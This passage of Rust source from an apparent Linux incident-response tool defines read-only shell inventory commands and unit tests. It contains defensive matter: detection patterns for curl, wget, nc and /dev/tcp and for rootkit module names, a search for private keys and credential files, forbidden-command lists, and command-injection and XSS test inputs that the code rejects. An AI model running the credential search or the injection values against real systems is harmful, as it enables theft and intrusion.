const OPEN_PORTS_COMMAND: &str = r#"if command -v ss >/dev/null 2>&1; then ss -H -tulnp 2>/dev/null | head -n 500 | awk '{local=$5; port=local; sub(/^.*:/,"",port); addr=substr(local,1,length(local)-length(port)-1); gsub(/^\[/,"",addr); gsub(/\]$/,"",addr); proc=""; for(i=7;i<=NF;i++) proc=proc (i==7?"":" ") $i; gsub(/\t/," ",proc); pid=proc; sub(/^.*pid=/,"",pid); sub(/,.*/,"",pid); if(pid !~ /^[0-9]+$/) pid=""; print $1"\t"addr"\t"port"\t"pid"\t"proc"\t"}'; else netstat -tulnp 2>/dev/null | tail -n +3 | head -n 500 | awk '{local=$4; port=local; sub(/^.*:/,"",port); addr=substr(local,1,length(local)-length(port)-1); gsub(/^\[/,"",addr); gsub(/\]$/,"",addr); proc=$7; gsub(/\t/," ",proc); pid=proc; sub(/\/.*/,"",pid); if(pid !~ /^[0-9]+$/) pid=""; print $1"\t"addr"\t"port"\t"pid"\t"proc"\t"}'; fi"#;
const USERS_COMMAND: &str =
    r#"getent passwd 2>/dev/null | head -n 500 | awk -F: '{print $1"\t"$3"\t"$4"\t"$6"\t"$7}'"#;
const AUTOSTART_COMMAND: &str = r#"systemctl list-unit-files --type=service --state=enabled --no-pager --no-legend 2>/dev/null | head -n 500 | awk '{print $1"\t"$1"\t"$2"\tsystemd"}'"#;
const CRON_COMMAND: &str = r#"for f in /etc/crontab /etc/cron.d/*; do [ -f "$f" ] || continue; awk -v src="$f" 'NF && $1 !~ /^#/ {cmd=""; for(i=7;i<=NF;i++) cmd=cmd (i==7?"":" ") $i; gsub(/\t/," ",cmd); print $6"\t"$1" "$2" "$3" "$4" "$5"\t"cmd"\t"src}' "$f" 2>/dev/null; done | head -n 500"#;
const SSH_KEYS_COMMAND: &str = r#"for f in /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys; do [ -f "$f" ] || continue; u=$(stat -c %U "$f" 2>/dev/null); awk -v u="$u" -v f="$f" 'NF>=2 && $1 !~ /^#/ {comment=""; for(i=3;i<=NF;i++) comment=comment (i==3?"":" ") $i; print u"\t"$1"\t"$2"\t"comment"\t"f}' "$f"; done | head -n 500"#;
const LOGIN_HISTORY_COMMAND: &str = r#"last -Faiw 2>/dev/null | head -n 200 | awk 'NF>=3 && $1 !~ /^(wtmp|btmp|reboot|shutdown)$/ {time=""; for(i=4;i<=NF;i++) time=time (i==4?"":" ") $i; gsub(/\t/," ",time); print $1"\t"$2"\t"$3"\t"time"\tlogin"}'"#;
const SUID_COMMAND: &str = r#"find /bin /sbin /usr/bin /usr/sbin /usr/local/bin -xdev -type f \( -perm -4000 -o -perm -2000 \) -printf '%p\t%m\t%u\t%s\t%TY-%Tm-%TdT%TH:%TM:%TS\tnormal\n' 2>/dev/null | head -n 500"#;
const AUTORUNS_COMMAND: &str = r#"systemctl list-unit-files --type=service --state=enabled --no-pager --no-legend 2>/dev/null | head -n 300 | awk '{print "systemd\t"$1"\t"$2"\t"$1"\t"}'"#;
const FIREWALL_COMMAND: &str = r#"iptables-save 2>/dev/null | grep '^-A ' | head -n 500 | awk '{rule=$0; gsub(/\t/," ",rule); print $2"\t\t\t\t\t"rule}'"#;
const ENV_COMMAND: &str = r#"env 2>/dev/null | sort | head -n 500 | awk -F= '{name=$1; value=substr($0,length(name)+2); risk=(name=="LD_PRELOAD" || name=="LD_LIBRARY_PATH" ? "warning" : "normal"); gsub(/\t/," ",value); print name"\t"value"\t"risk}'"#;
const SHELL_CONFIG_COMMAND: &str = r#"for f in /etc/profile /etc/bash.bashrc /root/.bashrc /home/*/.bashrc; do [ -f "$f" ] || continue; owner=$(stat -c %U "$f" 2>/dev/null); mtime=$(stat -c %Y "$f" 2>/dev/null); awk -v f="$f" -v o="$owner" -v m="$mtime" '{line=$0; gsub(/\t/," ",line); risk=(line ~ /(curl|wget|nc |ncat|LD_PRELOAD|\/dev\/tcp)/ ? "warning" : "normal"); print f"\t"o"\t"m"\t"NR"\t"line"\t"risk}' "$f"; done | head -n 1000"#;
const PACKAGES_COMMAND: &str = r#"if command -v dpkg-query >/dev/null 2>&1; then dpkg-query -W -f='${binary:Package}\t${Version}\t\tdpkg\n' 2>/dev/null | head -n 500; elif command -v rpm >/dev/null 2>&1; then rpm -qa --qf '%{NAME}\t%{VERSION}-%{RELEASE}\t%{INSTALLTIME}\trpm\n' 2>/dev/null | head -n 500; fi"#;
const SUDOERS_COMMAND: &str = r#"for f in /etc/sudoers /etc/sudoers.d/*; do [ -f "$f" ] || continue; awk -v src="$f" 'NF && $1 !~ /^#/ {line=$0; gsub(/\t/," ",line); np=(line ~ /NOPASSWD/ ? "yes" : "no"); print $1"\tALL\t"line"\t"np"\t"src}' "$f" 2>/dev/null; done | head -n 500"#;
const TIMERS_COMMAND: &str = r#"systemctl list-timers --all --no-pager --no-legend 2>/dev/null | head -n 500 | awk '{print $(NF-1)"\t"$1" "$2"\t"$3"\t"$4" "$5"\t"$NF}'"#;
const KERNEL_MODULES_COMMAND: &str = r#"{ awk '{risk=($1 ~ /(diamorphine|reptile|rootkit)/ ? "high" : "normal"); print $1"\t"$2"\t"$3"\t"risk}' /proc/modules 2>/dev/null; for f in /etc/modprobe.d/lovelyres-blacklist-*.conf; do [ -f "$f" ] && [ ! -L "$f" ] || continue; b=${f##*/}; m=${b#lovelyres-blacklist-}; m=${m%.conf}; printf '%s\n' "$m" | grep -Eq '^[A-Za-z0-9_][A-Za-z0-9_.-]{0,127}$' || continue; [ "$(wc -l < "$f")" -eq 2 ] || continue; grep -Fqx '# Managed by LovelyRes; remove through LovelyRes to preserve audit history.' "$f" || continue; grep -Fqx "blacklist $m" "$f" || continue; awk -v m="$m" '$1==m {found=1} END{exit !found}' /proc/modules 2>/dev/null || printf '%s\t0\t0\twarning\n' "$m"; done; } | head -n 500"#;
const ROOTCHECK_COMMAND: &str = r#"printf 'LD_PRELOAD\t'; if [ -s /etc/ld.so.preload ]; then printf 'suspicious\t'; head -n 3 /etc/ld.so.preload 2>/dev/null | tr '\n\t' '  '; else printf 'clean\t-'; fi; printf '\n'; printf 'SSH binary strings\t'; n=$(strings /usr/sbin/sshd 2>/dev/null | grep -Eic 'backdoor|secret|hack'); if [ "${n:-0}" -gt 0 ]; then printf 'suspicious\t%s\n' "$n"; else printf 'clean\t0\n'; fi; printf 'Recent PAM modules\t'; n=$(find /lib/security /lib64/security -name '*.so' -mmin -10080 2>/dev/null | wc -l); if [ "$n" -gt 0 ]; then printf 'suspicious\t%s\n' "$n"; else printf 'clean\t0\n'; fi"#;
const SENSITIVE_COMMAND: &str = r#"find /root /home /etc /var/www -maxdepth 4 \( -name '*.pem' -o -name '*.key' -o -name 'id_rsa*' -o -name 'id_ed25519*' -o -name '.env' -o -name 'wp-config.php' -o -name '.git-credentials' -o -name '.netrc' -o -name '.pgpass' -o -name '.my.cnf' -o -name 'shadow' -o -name 'gshadow' \) -type f -printf '%p\tsensitive\t%m\t%u\t%TY-%Tm-%TdT%TH:%TM:%TS\n' 2>/dev/null | head -n 500"#;
const RECENT_FILES_COMMAND: &str = r#"find /etc /usr/bin /usr/sbin /usr/lib /usr/local/bin /var/www /tmp /var/tmp /dev/shm -xdev -type f -mtime -3 -printf '%p\t%TY-%Tm-%TdT%TH:%TM:%TS\t%s\t%u\tnormal\n' 2>/dev/null | head -n 500"#;
const DOCKER_COMMAND: &str = r#"docker ps -a --format '{{.ID}}\t{{.Names}}\t{{.Image}}\t{{.Status}}\t{{.Ports}}\t{{.CreatedAt}}' 2>/dev/null | head -n 500"#;
const KUBERNETES_COMMAND: &str = r#"kubectl get pods -A --no-headers 2>/dev/null | head -n 500 | awk '{print $1"\t"$2"\t"$3"\t"$4"\t"$5"\t"$6}'"#;
const WEB_APPS_COMMAND: &str = r#"(nginx -T 2>/dev/null | grep -E 'server_name|listen|root' | head -n 100 | awk '{line=$0; gsub(/\t/," ",line); print "nginx\t"line"\tconfigured\t\t"}'; apachectl -S 2>/dev/null | head -n 100 | awk '{line=$0; gsub(/\t/," ",line); print "apache\t"line"\tconfigured\t\t"}')"#;

#[cfg(test)]
mod tests {
    use std::{fs, path::PathBuf, sync::Arc};

    use chrono::Utc;
    use uuid::Uuid;

    use super::*;

    /// Every quote in an awk program has to close.
    ///
    /// The open-ports and established-connection programs both ended with one
    /// quote too many: it opened a string that swallowed the closing brace, so
    /// awk saw neither a block end nor a terminated string and refused the
    /// whole program. Both tabs showed the parser error where the ports should
    /// have been, on every target, for as long as they had existed. A stray
    /// quote is invisible in a line this long, so it is counted here instead.
    #[test]
    fn every_awk_program_is_balanced_and_closes_its_block() {
        for tab in SystemInfoTab::ALL {
            let command = tab.command();
            for (index, program) in command.split('\'').enumerate() {
                // Odd chunks are what sits inside the shell's single quotes,
                // which is where the awk programs live.
                if index % 2 == 0 || !program.contains("print ") {
                    continue;
                }
                let quotes = program.matches('"').count();
                assert_eq!(
                    quotes % 2,
                    0,
                    "{tab:?} has an unbalanced quote in: {program}",
                );
                assert!(
                    program.trim_end().ends_with('}'),
                    "{tab:?} does not close its awk block: {program}",
                );
                assert_eq!(
                    program.matches('{').count(),
                    program.matches('}').count(),
                    "{tab:?} has unbalanced braces in: {program}",
                );
            }
        }
    }
    use crate::{
        BackendServices, PortableStore,
        ssh::{SshConnectionStatus, TestSessionHarness},
        target::TargetIdentity,
    };

    #[derive(Debug)]
    struct TestRoot(PathBuf);

    impl TestRoot {
        fn new() -> Self {
            let path =
                std::env::temp_dir().join(format!("lovelyres-system-info-{}", Uuid::new_v4()));
            fs::create_dir_all(&path).unwrap();
            Self(path)
        }
    }

    impl Drop for TestRoot {
        fn drop(&mut self) {
            let _ = fs::remove_dir_all(&self.0);
        }
    }

    async fn bound_services(
        root: &TestRoot,
    ) -> (BackendServices, BoundSshSession, Arc<TestSessionHarness>) {
        let services =
            BackendServices::new(PortableStore::prepare(root.0.clone()).unwrap()).unwrap();
        let guard = services
            .activate_target(TargetIdentity::new("connection-a").unwrap())
            .unwrap();
        let status = SshConnectionStatus {
            session_id: "session-a".to_owned(),
            connection_id: "connection-a".to_owned(),
            host: "host-a.test".to_owned(),
            port: 22,
            username: "operator".to_owned(),
            host_key_fingerprint: "SHA256:test".to_owned(),
            connected_at: Utc::now(),
        };
        let session = BoundSshSession::from_status(guard, &status, "test session").unwrap();
        let harness = Arc::new(TestSessionHarness::default());
        services
            .ssh()
            .install_test_session(status, harness.clone())
            .await
            .unwrap();
        (services, session, harness)
    }

    #[test]
    fn all_legacy_tabs_have_static_read_only_commands_and_columns() {
        assert_eq!(SystemInfoTab::ALL.len(), 25);
        for tab in SystemInfoTab::ALL {
            assert!(
                !tab.command().trim().is_empty(),
                "missing command for {tab:?}"
            );
            assert!(!tab.columns().is_empty(), "missing columns for {tab:?}");
            let lower = tab.command().to_lowercase();
            for forbidden in [
                "; rm ",
                "&& rm ",
                "| rm ",
                "\nrm ",
                "kill ",
                "pkill",
                "systemctl stop",
                "systemctl disable",
                "chmod ",
                "chown ",
                "iptables -a",
                "iptables -d",
                "userdel",
            ] {
                assert!(
                    !lower.contains(forbidden),
                    "{tab:?} contains write-capable command token {forbidden}"
                );
            }
        }
    }

    #[test]
    fn malicious_rows_are_bounded_sanitized_and_column_aligned() {
        let request = SystemInfoRequest::new(SystemInfoTab::Users, 2).unwrap();
        let attack = format!(
            "<img src=x onerror=bad>\t0\t0\t/home/x\t{}\nsecond\t1\t1\t/home/y\t/bin/sh\nthird\t2\t2\t/x\t/y",
            "界".repeat(MAX_CELL_CHARS + 20)
        );
        let table = parse_table(&request, &attack);
        assert_eq!(table.rows.len(), 2);
        assert!(table.truncated);
        assert_eq!(table.rows[0].cells.len(), 5);
        assert_eq!(table.rows[0].cells[4].chars().count(), MAX_CELL_CHARS);
        assert_eq!(table.rows[0].cells[0], "<img src=x onerror=bad>");
    }

    #[test]
    fn summary_parser_is_typed_and_rejects_unmarked_output() {
        let summary = parse_summary(
            "hostname\thost-a\nos\tLinux\nkernel\t6.8\narchitecture\tx86_64\nvirtualization\tkvm\nboot_time\t2026-08-11 10:00:00\ntimezone\tAsia/Taipei\nlocale\tzh_TW.UTF-8\ninit_system\tsystemd\npackage_manager\tdnf\nselinux\tEnforcing\napparmor\tunavailable\nuptime\t42.9\nload\t1 2 3\ncpu_cores\t8\nmem_total\t1024\nswap_total\t2048\nroot_device\t/dev/vda1\nroot_filesystem\txfs\nprimary_ip\t10.0.0.2\ndefault_gateway\t10.0.0.1\ndns_servers\t1.1.1.1,8.8.8.8\n",
        )
        .unwrap();
        assert_eq!(summary.hostname, "host-a");
        assert_eq!(summary.uptime_seconds, 0);
        assert_eq!(summary.load_average, ["1", "2", "3"]);
        assert_eq!(summary.cpu_cores, 8);
        assert_eq!(summary.architecture, "x86_64");
        assert_eq!(summary.virtualization, "kvm");
        assert_eq!(summary.swap_total_bytes, 2_048);
        assert_eq!(summary.root_filesystem, "xfs");
        assert_eq!(summary.default_gateway, "10.0.0.1");
        assert!(parse_summary("untrusted noise").is_err());
    }

    #[test]
    fn summary_command_is_read_only_and_collects_the_overview_contract() {
        for marker in [
            "architecture\\t",
            "virtualization\\t",
            "boot_time\\t",
            "timezone\\t",
            "swap_total\\t",
            "root_filesystem\\t",
            "primary_ip\\t",
            "default_gateway\\t",
            "dns_servers\\t",
            "selinux\\t",
            "apparmor\\t",
        ] {
            assert!(SUMMARY_COMMAND.contains(marker), "missing {marker}");
        }
        let lower = SUMMARY_COMMAND.to_lowercase();
        for forbidden in [
            " rm ",
            " kill ",
            " chmod ",
            " chown ",
            "systemctl stop",
            "iptables -",
            "userdel ",
        ] {
            assert!(
                !lower.contains(forbidden),
                "unsafe summary token {forbidden}"
            );
        }
    }

    #[test]
    fn request_limit_is_bounded() {
        assert!(SystemInfoRequest::new(SystemInfoTab::Processes, 0).is_err());
        assert!(SystemInfoRequest::new(SystemInfoTab::Processes, MAX_ROWS + 1).is_err());
        assert!(SystemInfoRequest::new(SystemInfoTab::Processes, MAX_ROWS).is_ok());
    }

    #[test]
    fn stable_row_identity_survives_insertion_and_reordering() {
        let request = SystemInfoRequest::new(SystemInfoTab::Users, MAX_ROWS).unwrap();
        let first = parse_table(
            &request,
            "alice\t1000\t1000\t/home/alice\t/bin/bash\nbob\t1001\t1001\t/home/bob\t/bin/sh",
        );
        let reordered = parse_table(
            &request,
            "mallory\t2000\t2000\t/home/mallory\t/bin/sh\nbob\t1001\t1001\t/home/bob\t/bin/zsh\nalice\t1000\t1000\t/home/alice\t/bin/bash",
        );
        let alice = first
            .rows
            .iter()
            .find(|row| row.cells[0] == "alice")
            .unwrap();
        let alice_after = reordered
            .rows
            .iter()
            .find(|row| row.cells[0] == "alice")
            .unwrap();
        let bob = first.rows.iter().find(|row| row.cells[0] == "bob").unwrap();
        let bob_after = reordered
            .rows
            .iter()
            .find(|row| row.cells[0] == "bob")
            .unwrap();
        assert_eq!(alice.id, alice_after.id);
        assert_eq!(bob.id, bob_after.id);

        let duplicates = parse_table(
            &request,
            "alice\t1000\t1000\t/home/alice\t/bin/bash\nalice\t1000\t1000\t/home/alice\t/bin/bash",
        );
        assert_ne!(duplicates.rows[0].id, duplicates.rows[1].id);
        assert!(duplicates.rows[0].id.ends_with("-0"));
        assert!(duplicates.rows[1].id.ends_with("-1"));
    }

    #[test]
    fn detail_requests_are_derived_from_validated_typed_row_identity() {
        let cases = [
            (
                SystemInfoTab::Processes,
                "normal\t123\t1\troot\tS\t0\t0\t1\t/bin/sh",
            ),
            (
                SystemInfoTab::Services,
                "sshd.service\tactive\trunning\tOpenSSH",
            ),
            (
                SystemInfoTab::Users,
                "alice\t1000\t1000\t/home/alice\t/bin/sh",
            ),
            (
                SystemInfoTab::SshKeys,
                "alice\tssh-ed25519\tQUJDREVGR0hJSktMTU5PUA==\twork\t/home/alice/.ssh/authorized_keys",
            ),
            (
                SystemInfoTab::SuidFiles,
                "/usr/bin/passwd\t4755\troot\t1\t2026\tnormal",
            ),
            (SystemInfoTab::Packages, "openssl\t3.0\t2026\tdpkg"),
            (SystemInfoTab::KernelModules, "nf_conntrack\t1\t1\tnormal"),
            (
                SystemInfoTab::RecentFiles,
                "/tmp/report.txt\t2026\t1\troot\tnormal",
            ),
        ];
        for (tab, output) in cases {
            let request = SystemInfoRequest::new(tab, 1).unwrap();
            let table = parse_table(&request, output);
            let detail = table.detail_request(&table.rows[0].id).unwrap().unwrap();
            assert_eq!(detail.tab, tab);
            assert_eq!(detail.row_id, table.rows[0].id);
            let command = detail.command().to_lowercase();
            for forbidden in [
                "; rm ",
                "&& rm ",
                "| rm ",
                "\nrm ",
                " kill ",
                "systemctl stop",
                "systemctl disable",
                "chmod ",
                "chown ",
            ] {
                assert!(
                    !command.contains(forbidden),
                    "unsafe detail command: {command}"
                );
            }
            assert!(table.detail_request("forged-row-id").is_err());
        }

        let unsupported = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Firewall, 1).unwrap(),
            "INPUT\tACCEPT\ttcp\t0.0.0.0\t0.0.0.0\t--dport 22",
        );
        assert!(
            unsupported
                .detail_request(&unsupported.rows[0].id)
                .unwrap()
                .is_none()
        );

        for tab in SystemInfoTab::ALL.into_iter().filter(|tab| {
            !matches!(
                *tab,
                SystemInfoTab::Processes
                    | SystemInfoTab::Services
                    | SystemInfoTab::Users
                    | SystemInfoTab::SshKeys
                    | SystemInfoTab::SuidFiles
                    | SystemInfoTab::Packages
                    | SystemInfoTab::KernelModules
                    | SystemInfoTab::RecentFiles
            )
        }) {
            let table = SystemInfoTable {
                tab,
                columns: tab
                    .columns()
                    .iter()
                    .map(|column| (*column).to_owned())
                    .collect(),
                rows: vec![SystemInfoRow {
                    id: "typed-row".to_owned(),
                    cells: vec![String::new(); tab.columns().len()],
                    risk: SystemInfoRisk::Normal,
                }],
                truncated: false,
            };
            assert!(
                table.detail_request("typed-row").unwrap().is_none(),
                "{tab:?} must not synthesize a remote action"
            );
        }
    }

    #[test]
    fn malicious_detail_keys_are_rejected_or_shell_quoted() {
        for (tab, output) in [
            (
                SystemInfoTab::Processes,
                "normal\t1;id\t1\troot\tS\t0\t0\t1\t/bin/sh",
            ),
            (
                SystemInfoTab::Services,
                "sshd.service;id\tactive\trunning\tOpenSSH",
            ),
            (SystemInfoTab::Users, "root;id\t0\t0\t/root\t/bin/sh"),
            (SystemInfoTab::Packages, "openssl;id\t3.0\t2026\tdpkg"),
            (
                SystemInfoTab::KernelModules,
                "nf_conntrack;id\t1\t1\tnormal",
            ),
            (
                SystemInfoTab::Services,
                "--help\tactive\trunning\toption injection",
            ),
            (SystemInfoTab::Packages, "--help\t3.0\t2026\tdpkg"),
            (SystemInfoTab::KernelModules, "--help\t1\t1\tnormal"),
        ] {
            let table = parse_table(&SystemInfoRequest::new(tab, 1).unwrap(), output);
            assert!(table.detail_request(&table.rows[0].id).is_err());
        }

        let path = "/tmp/a'; touch /tmp/never";
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::RecentFiles, 1).unwrap(),
            &format!("{path}\t2026\t1\troot\tnormal"),
        );
        let detail = table.detail_request(&table.rows[0].id).unwrap().unwrap();
        assert!(detail.command().starts_with(&format!("p={}", shq(path))));
    }

    #[test]
    fn detail_output_is_plain_bounded_text() {
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Processes, 1).unwrap(),
            "normal\t123\t1\troot\tS\t0\t0\t1\t/bin/sh",
        );
        let request = table.detail_request(&table.rows[0].id).unwrap().unwrap();
        let mut output = format!(
            "<script>label</script>\t<img onerror=bad>{}\n",
            "界".repeat(MAX_CELL_CHARS + 1)
        );
        output.push_str(&"extra\tvalue\n".repeat(70));
        let detail = parse_detail(&request, &output);
        assert_eq!(detail.fields.len(), 64);
        assert_eq!(detail.fields[0].label, "<script>label</script>");
        assert_eq!(detail.fields[0].value.chars().count(), MAX_CELL_CHARS);
    }

    #[test]
    fn process_investigation_catalog_replaces_every_legacy_read_action() {
        assert_eq!(ProcessInvestigationGroup::ALL.len(), 8);
        assert_eq!(ProcessInvestigationAction::ALL.len(), 40);
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Processes, 1).unwrap(),
            "normal\t123\t1\troot\tS\t0\t0\t1\t/bin/sh",
        );
        let row_id = table.rows[0].id.clone();
        for action in ProcessInvestigationAction::ALL {
            assert!(!action.label().is_empty());
            assert!(ProcessInvestigationGroup::ALL.contains(&action.group()));
            let request = table
                .process_investigation_request(&row_id, action)
                .unwrap();
            assert_eq!(request.pid(), 123);
            assert_eq!(request.action(), action);
            let command = request.command();
            assert!(command.starts_with("p='123';"), "{action:?}: {command}");
            for forbidden in [" kill -s ", " rm ", " chmod ", " chown ", "systemctl stop"] {
                assert!(!command.contains(forbidden), "{action:?}: {command}");
            }
        }

        let users = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Users, 1).unwrap(),
            "alice\t1000\t1000\t/home/alice\t/bin/sh",
        );
        assert!(
            users
                .process_investigation_request(
                    &users.rows[0].id,
                    ProcessInvestigationAction::CommandLine,
                )
                .is_err()
        );
        let forged = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Processes, 1).unwrap(),
            "normal\t1;id\t1\troot\tS\t0\t0\t1\t/bin/sh",
        );
        assert!(
            forged
                .process_signal_request(&forged.rows[0].id, ProcessSignal::Kill)
                .is_err()
        );
    }

    #[tokio::test]
    async fn process_investigation_is_target_bound_plain_and_byte_bounded() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Processes, 1).unwrap(),
            "normal\t123\t1\troot\tS\t0\t0\t1\t/bin/sh",
        );
        let request = table
            .process_investigation_request(
                &table.rows[0].id,
                ProcessInvestigationAction::Environment,
            )
            .unwrap();
        harness.set_execute_output(format!(
            "<script>alert(1)</script>\n{}",
            "界".repeat(MAX_PROCESS_INVESTIGATION_CHARS)
        ));
        let result = services
            .system_info()
            .investigate_process(&session, &request)
            .await
            .unwrap();
        assert!(result.output.starts_with("<script>alert(1)</script>"));
        assert!(result.output.len() <= MAX_PROCESS_INVESTIGATION_CHARS);
        assert!(result.truncated);

        services.target().clear().unwrap();
        assert!(
            services
                .system_info()
                .investigate_process(&session, &request)
                .await
                .is_err()
        );
    }

    #[tokio::test]
    async fn process_signal_requires_exact_confirmation_and_identity_snapshot() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Processes, 1).unwrap(),
            "normal\t123\t1\troot\tS\t0\t0\t1\t/bin/sh",
        );
        let request = table
            .process_signal_request(&table.rows[0].id, ProcessSignal::Terminate)
            .unwrap();

        harness.set_execute_output("123\t42\tbash");
        let wrong_plan = services
            .system_info()
            .plan_process_signal(&session, &request)
            .await
            .unwrap();
        let unrelated =
            OperationPlan::new(session.target().clone(), "unrelated", true, None).unwrap();
        assert!(
            services
                .system_info()
                .execute_process_signal(
                    &session,
                    wrong_plan,
                    DangerousConfirmation::approve(&unrelated),
                    services.operation_journal(),
                )
                .await
                .is_err()
        );
        assert!(services.operation_journal().entries().unwrap().is_empty());

        harness.set_execute_outputs(["123\t42\tbash", "123\t99\treused"]);
        let stale = services
            .system_info()
            .plan_process_signal(&session, &request)
            .await
            .unwrap();
        let confirmation = DangerousConfirmation::approve(stale.definition());
        assert!(
            services
                .system_info()
                .execute_process_signal(
                    &session,
                    stale,
                    confirmation,
                    services.operation_journal(),
                )
                .await
                .is_err()
        );
        assert!(services.operation_journal().entries().unwrap().is_empty());
    }

    #[tokio::test]
    async fn exact_process_signal_is_journaled_and_verified_without_fake_restore() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Processes, 1).unwrap(),
            "normal\t123\t1\troot\tS\t0\t0\t1\t/bin/sh",
        );
        let request = table
            .process_signal_request(&table.rows[0].id, ProcessSignal::Kill)
            .unwrap();
        harness.set_execute_outputs(["123\t42\tbash", "123\t42\tbash", "", "ABSENT"]);
        let plan = services
            .system_info()
            .plan_process_signal(&session, &request)
            .await
            .unwrap();
        assert_eq!(plan.snapshot().start_time_ticks, 42);
        assert!(plan.definition().restore_description.is_none());
        let confirmation = DangerousConfirmation::approve(plan.definition());
        let outcome = services
            .system_info()
            .execute_process_signal(&session, plan, confirmation, services.operation_journal())
            .await
            .unwrap();
        assert!(outcome.verification.passed);
        assert_eq!(outcome.pid, 123);
        let entries = services.operation_journal().entries().unwrap();
        assert_eq!(entries.len(), 2);
        assert!(
            entries
                .iter()
                .all(|entry| entry.source == "system-info-process")
        );
    }

    fn service_snapshot(
        active: &str,
        sub: &str,
        unit_file: &str,
        main_pid: u32,
        can_reload: bool,
    ) -> String {
        format!(
            "LoadState=loaded\nActiveState={active}\nSubState={sub}\nUnitFileState={unit_file}\nMainPID={main_pid}\nFragmentPath=/usr/lib/systemd/system/sshd.service\nCanReload={}\n",
            if can_reload { "yes" } else { "no" }
        )
    }

    #[test]
    fn service_investigation_catalog_replaces_every_legacy_read_action() {
        assert_eq!(ServiceInvestigationGroup::ALL.len(), 6);
        assert_eq!(ServiceInvestigationAction::ALL.len(), 19);
        assert_eq!(ServiceRuntimeAction::ALL.len(), 6);
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Services, 1).unwrap(),
            "sshd.service\tactive\trunning\tOpenSSH",
        );
        let row_id = table.rows[0].id.clone();
        for action in ServiceInvestigationAction::ALL {
            assert!(!action.label().is_empty());
            assert!(ServiceInvestigationGroup::ALL.contains(&action.group()));
            let request = table
                .service_investigation_request(&row_id, action)
                .unwrap();
            assert_eq!(request.unit(), "sshd.service");
            assert_eq!(request.action(), action);
            let command = request.command();
            assert!(
                command.starts_with("n='sshd.service';"),
                "{action:?}: {command}"
            );
            for forbidden in [
                "systemctl start",
                "systemctl stop",
                "systemctl restart",
                "systemctl reload --",
                "systemctl enable",
                "systemctl disable",
            ] {
                assert!(!command.contains(forbidden), "{action:?}: {command}");
            }
        }
        for action in ServiceRuntimeAction::ALL {
            assert!(!action.label().is_empty());
            let request = table.service_runtime_request(&row_id, action).unwrap();
            assert_eq!(request.unit(), "sshd.service");
            assert_eq!(request.action(), action);
        }

        for malicious in ["sshd.service;id", "--help", "bad name.service"] {
            let forged = parse_table(
                &SystemInfoRequest::new(SystemInfoTab::Services, 1).unwrap(),
                &format!("{malicious}\tactive\trunning\tforged"),
            );
            assert!(
                forged
                    .service_investigation_request(
                        &forged.rows[0].id,
                        ServiceInvestigationAction::Status,
                    )
                    .is_err()
            );
            assert!(
                forged
                    .service_runtime_request(&forged.rows[0].id, ServiceRuntimeAction::Stop,)
                    .is_err()
            );
        }
    }

    #[test]
    fn startup_and_timer_runtime_actions_are_closed_and_unit_typed() {
        let startup = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Autostart, 1).unwrap(),
            "sshd.service\tsshd.service\tenabled\tsystemd",
        );
        for action in ServiceRuntimeAction::AUTOSTART {
            let request = startup
                .service_runtime_request(&startup.rows[0].id, action)
                .unwrap();
            assert_eq!(request.unit(), "sshd.service");
            assert_eq!(request.action(), action);
        }
        assert!(
            startup
                .service_runtime_request(&startup.rows[0].id, ServiceRuntimeAction::Stop)
                .is_err()
        );

        let timer = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Timers, 1).unwrap(),
            "logrotate.timer\tnext\tleft\tlast\tlogrotate.service",
        );
        for action in ServiceRuntimeAction::TIMER {
            let request = timer
                .service_runtime_request(&timer.rows[0].id, action)
                .unwrap();
            assert_eq!(request.unit(), "logrotate.timer");
            assert_eq!(request.action(), action);
        }
        assert!(
            timer
                .service_runtime_request(&timer.rows[0].id, ServiceRuntimeAction::Start)
                .is_err()
        );
    }

    #[test]
    fn service_snapshot_parser_is_strict_and_identity_bound() {
        let parsed = parse_service_snapshot(
            "sshd.service",
            &service_snapshot("active", "running", "enabled", 123, true),
        )
        .unwrap();
        assert_eq!(parsed.unit, "sshd.service");
        assert_eq!(parsed.main_pid, 123);
        assert!(parsed.can_reload);
        assert_eq!(service_snapshot_sha256(&parsed).len(), 64);

        for invalid in [
            "LoadState=not-found\nActiveState=inactive\nSubState=dead\nUnitFileState=disabled\nMainPID=0\nFragmentPath=\nCanReload=no\n",
            "LoadState=loaded\nActiveState=active;id\nSubState=running\nUnitFileState=enabled\nMainPID=1\nFragmentPath=/a\nCanReload=yes\n",
            "LoadState=loaded\nActiveState=active\nSubState=running\nUnitFileState=enabled\nMainPID=oops\nFragmentPath=/a\nCanReload=yes\n",
            "LoadState=loaded\nActiveState=active\nSubState=running\nUnitFileState=enabled\nMainPID=1\nFragmentPath=relative\nCanReload=yes\n",
        ] {
            assert!(parse_service_snapshot("sshd.service", invalid).is_err());
        }
    }

    #[tokio::test]
    async fn service_investigation_is_target_bound_plain_and_byte_bounded() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Services, 1).unwrap(),
            "sshd.service\tactive\trunning\tOpenSSH",
        );
        let request = table
            .service_investigation_request(
                &table.rows[0].id,
                ServiceInvestigationAction::Environment,
            )
            .unwrap();
        harness.set_execute_output(format!(
            "<script>alert(1)</script>\n{}",
            "界".repeat(MAX_SERVICE_INVESTIGATION_CHARS)
        ));
        let result = services
            .system_info()
            .investigate_service(&session, &request)
            .await
            .unwrap();
        assert!(result.output.starts_with("<script>alert(1)</script>"));
        assert!(result.output.len() <= MAX_SERVICE_INVESTIGATION_CHARS);
        assert!(result.truncated);

        services.target().clear().unwrap();
        assert!(
            services
                .system_info()
                .investigate_service(&session, &request)
                .await
                .is_err()
        );
    }

    #[tokio::test]
